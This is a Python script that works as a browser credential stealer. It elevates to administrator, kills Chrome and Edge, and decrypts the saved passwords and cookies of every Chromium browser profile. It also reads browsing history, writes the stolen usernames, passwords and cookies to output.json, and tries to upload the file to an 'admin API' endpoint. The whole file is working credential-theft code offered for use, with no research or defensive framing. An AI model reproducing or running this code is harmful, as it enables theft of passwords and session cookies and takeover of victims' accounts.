import json
import os
import re
import sqlite3
import subprocess
from utils import get_available_chromium_based_browsers_dirs, get_secret_key, decrypt_password, get_db_connection, db_to_json, image_to_base64
from models import Profile
import pyuac

if __name__ == "__main__":
    if not pyuac.isUserAdmin():
        print("Re-launching as admin!")
        pyuac.runAsAdmin()
    else:
        subprocess.call("TASKKILL /f  /IM  CHROME.EXE")
        subprocess.call("TASKKILL /f  /IM  MSEDGE.EXE")

av_broswers = get_available_chromium_based_browsers_dirs()

bs = []

for av_b in av_broswers:

    #Get secret key
    secret_key = get_secret_key(av_b)

    #Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(av_b) if re.search("^Profile*|^Default$",element)!=None]

    #Results
    profiles = []

    for profileFolder in folders:
        profile = Profile()
        profile.name = profileFolder

        #profile pic
        try:
            profile.profilePic = image_to_base64([file for file in os.listdir(f"{av_b}\\{profileFolder}") if file.endswith("Profile Picture.png")][0])
        except:print("No I")

        #passwords
        #(2) Get ciphertext from sqlite database
        chrome_path_login_db = os.path.normpath(f"{av_b}\\{profileFolder}\\Login Data")
        passwords_db_name, passwords_db_conn = get_db_connection(chrome_path_login_db)

        if(secret_key and passwords_db_conn):
            cursor = passwords_db_conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for index,login in enumerate(cursor.fetchall()):
                url = login[0]
                username = login[1]
                ciphertext = login[2]
                if(url!="" and username!="" and ciphertext!=""):
                    #(3) Filter the initialisation vector & encrypted password from ciphertext 
                    #(4) Use AES algorithm to decrypt the password
                    decrypted_password = decrypt_password(ciphertext, secret_key)
                    #print("Sequence: %d"%(index))
                    #print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                    #print("="*50)
                    #(5) Save into CSV 
                    profile.passwords.append({
                        'index': index,
                        'url': url,
                        'username': username,
                        'password': decrypted_password
                    })
            #Close database connection
            cursor.close()
            passwords_db_conn.close()
            #Delete temp login db
            os.remove(passwords_db_name)

        #cookies
        chrome_path_cookies_db = os.path.normpath(f"{av_b}\\{profileFolder}\\Network\\Cookies")
        if os.path.exists(chrome_path_cookies_db) == False:
            chrome_path_cookies_db = os.path.normpath(f"{av_b}\\{profileFolder}\\Cookies")
        print(chrome_path_cookies_db)
        try:
            cookies_db_name, cookies_db_conn = get_db_connection(chrome_path_cookies_db)
        except:
            try:
                cookies_db_conn = sqlite3.connect(chrome_path_cookies_db)
            except:pass

        try:
            cookies_db_conn.text_factory = bytes
            profile.cookies = db_to_json(cookies_db_conn, secret_key=secret_key)
            #Close database connection
            cookies_db_conn.close()
        except:pass
        #Delete temp login db
        try:
            os.remove(cookies_db_name)
        except:pass

        #history
        chrome_path_history_db = os.path.normpath(f"{av_b}\\{profileFolder}\\History")
        history_db_name, history_db_conn = get_db_connection(chrome_path_history_db)
        history_db_conn.text_factory = bytes
        #profile.history = db_to_json(history_db_conn)
        #Close database connection
        history_db_conn.close()
        #Delete temp login db
        os.remove(history_db_name)

        profiles.append(profile.to_json())

    bs.append(profiles)

with open('output.json', 'w') as f:
    json.dump(bs, f)

# Try to upload data to admin API
try:
    from api_upload import upload_output_file
    print("\n Attempting to upload data to admin API...")
    if upload_output_file("output.json", "http://localhost:8000/api/upload/"):
        print(" Data uploaded successfully!")
    else:
        print("  Upload failed. You can manually import the data from output.json")
except ImportError:
    print("  API upload module not available. You can manually import the data from output.json")
except Exception as e:
    print(f"  Upload error: {str(e)}")
    print("You can manually import the data from output.json")